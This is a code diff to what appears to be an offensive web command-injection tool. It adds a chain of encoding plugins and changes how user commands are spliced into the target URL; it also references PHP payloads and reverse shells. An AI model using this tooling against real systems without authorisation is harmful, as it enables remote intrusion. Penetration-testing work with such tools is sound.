@@ -29,7 +29,7 @@ if (sys.version_info < (3, 0)):
 ## Configs
 
 class cfg:
-  version = "0.7"
+  version = "0.7.b"
   url = "http://www.example.com?"
   history_file = os.path.abspath(os.path.expanduser("~/.shellfire_history"))
   post_data = {}
@@ -249,8 +249,8 @@ def cmd_cookies(cmd):
 
 def cmd_encode(cmd):
   if len(cmd) == 1:
-    sys.stdout.write("[*] encoding: %s\n" % (cfg.encode))
-    sys.stdout.write("[*] encoding: %s\n" % (cfg.encode_chain))
+    #sys.stdout.write("[*] encoding: %s\n" % (cfg.encode))
+    sys.stdout.write("[*] encoding: %s\n" % (' | '.join(cfg.encode_chain)))
     return False
   ##  let's remove ".encode" from our cmd
   cmd.pop(0)
@@ -268,19 +268,6 @@ def cmd_encode(cmd):
           return False
   except:
     pass
-  #elif len(cmd) != 2:
-  #  sys.stderr.write("[!] Invalid parameters\n")
-  #  return True
-  #if cmd[1] == "base64":
-  #  cfg.encode = cmd[1]
-  #  sys.stdout.write("[*] encoding set to base64\n")
-  #  return False
-  #elif cmd[1] == "none":
-  #  cfg.encode = None
-  #  sys.stdout.write("[*] encoding removed\n")
-  #  return False
-  #else:
-  #  sys.stderr.write("[!] Invalid parameters\n")
   return False
 
 def cmd_find(cmd):
@@ -391,7 +378,6 @@ def cmd_post(cmd):
     cfg.post = {}
   else:
     cmd.pop(0)
-    #cfg.post = json.loads(userinput[len(cmd[0])+1:])
     cfg.post = json.loads(" ".join(cmd))
   sys.stdout.write("[*] POST data set: %s\n" % cfg.post)
   return
@@ -399,7 +385,6 @@ def cmd_post(cmd):
 def cmd_referer(cmd):
   if len(cmd) > 1:
     cmd.pop(0)
-    #cfg.headers['Referer'] = cfg.userinput[len(cmd[0])+1:]
     cfg.headers['Referer'] = " ".join(cmd)
   sys.stdout.write("[*] Referer set: %s\n" % cfg.headers['Referer'])
   return
@@ -480,11 +465,6 @@ if os.path.isfile(cfg.history_file):
 ## set initial payload for PHP
 payload_php()
 
-
-#print(plugins.apply_all(5))
-#print(plugins.plugins['base64'].run(5))
-#print(plugins.apply('base64', 5))
-
 ## main loop
 while True:
   while cfg.revshell_running:
@@ -537,22 +517,29 @@ while True:
 
   ## execute our command to the remote target
   if exec_cmd:
-    ## make sure our encoding is correct
-    if cfg.encode == "base64":
-      #cmd = base64.b64encode(userinput.encode()).decode()
-      cmd = plugins.apply('base64', userinput)
+    cmd = userinput
+
+    ## if there are no encoding plugins, let's just escape our backslashes
+    if not len(cfg.encode_chain):
+      #cmd = cmd.replace("\\", "\\\\")
+      pass
     else:
-      cmd = re.sub('&', '%26', userinput)
-      cmd = cmd.replace("\\", "\\\\")
+      ## let's run our input through our encoding plugins
+      try:
+        for enc in cfg.encode_chain:
+          cmd = plugins.plugins[enc].run(cmd)
+      except:
+        pass
+
     ## validate the URL format
     if '%CMD%' in cfg.url:
-      query = re.sub('%CMD%', cmd.strip(), cfg.url)
+      query = cfg.url.replace('%CMD%', cmd.strip())
     else:
       if '?' in cfg.url:
         if 'cmd=' not in cfg.url:
           query = cfg.url + '&cmd=' + cmd
         else:
-          query = re.sub('cmd=', 'cmd=' + cmd, cfg.url)
+          query = cfg.url.replace('cmd=', 'cmd=' + cmd)
       else:
         query = cfg.url + cmd.strip()
     ## log debug info
